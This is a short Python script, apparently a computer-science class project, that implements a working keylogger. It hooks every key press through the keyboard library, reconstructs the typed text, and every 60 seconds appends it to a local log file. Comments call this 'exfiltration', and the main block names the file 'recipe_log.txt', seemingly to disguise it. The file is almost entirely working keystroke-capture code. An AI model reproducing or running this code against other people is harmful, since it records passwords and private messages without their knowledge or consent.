# Landscapes of CS Keylogger 4/14/2026
import keyboard
import threading
import time
import os

class Keylogger:
    def __init__(self, log_file="log.txt"):
        self.log_file = log_file
        self.buffer = []
        self.running = True
        self.last_write = time.time()
        self.write_interval = 60
        # shift now works
        self.shift_pressed = False
    
    def on_key(self, event):
        # the processes for each key press
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            
            # checks if shift is pressed
            if key == 'shift':
                self.shift_pressed = True
                return
            elif key == 'shift_r' or key == 'shift_l':
                self.shift_pressed = True
                return
            
            # regular characters
            if len(key) == 1:
                # shift if
                if self.shift_pressed:
                    key = key.upper()
                self.buffer.append(key)
            
            # special keys
            elif key == 'backspace':
                if len(self.buffer) > 0:
                    self.buffer.pop()
            
            elif key == 'enter':
                self.buffer.append('\n')
            
            elif key == 'space':
                self.buffer.append(' ')
            
            elif key == 'tab':
                self.buffer.append('    ')
    
    def on_key_release(self, event):
        #tracks shift
        if event.name == 'shift' or event.name == 'shift_r' or event.name == 'shift_l':
            self.shift_pressed = False
    
    def write_buffer(self):
        # exfiltration buffer
        if self.buffer:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.buffer))
                f.write(f'\n[--- Written at {time.ctime()} ---]\n')
            print(f"[+] {len(self.buffer)} chars written to {self.log_file}")
            self.buffer = []
    
    def timer_loop(self):
        #60 second write buffer
        while self.running:
            time.sleep(self.write_interval)
            if self.running:
                self.write_buffer()
    
    def start(self): #start

        # 60-second exfiltration
        timer_thread = threading.Thread(target=self.timer_loop, daemon=True)
        timer_thread.start()
        
        # kill switch (Ctrl+Alt+S)
        keyboard.add_hotkey('ctrl+alt+s', self.stop)
        
        # listening for keys
        keyboard.on_press(self.on_key)
        keyboard.on_release(self.on_key_release)
        
        # wait
        keyboard.wait()
    
    def stop(self):

        self.running = False
        
        # writes any remaining buffer to file
        if self.buffer:
            with open(self.log_file, 'a') as f:
                f.write(''.join(self.buffer))
                f.write(f'\n[--- FINAL BUFFER at {time.ctime()} ---]\n')
            print(f"[+] Final buffer ({len(self.buffer)} chars) written to {self.log_file}")
        
        print(f"[+] Log file saved as: {self.log_file}")
        os._exit(0)


# Main
if __name__ == "__main__":
    #starts the keylogger
    logger = Keylogger("recipe_log.txt")  #saves the recipe
    
    import sys
    print(sys.executable)

    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
    except Exception as e:
        print(f"Error: {e}")
        input("Press Enter to exit...")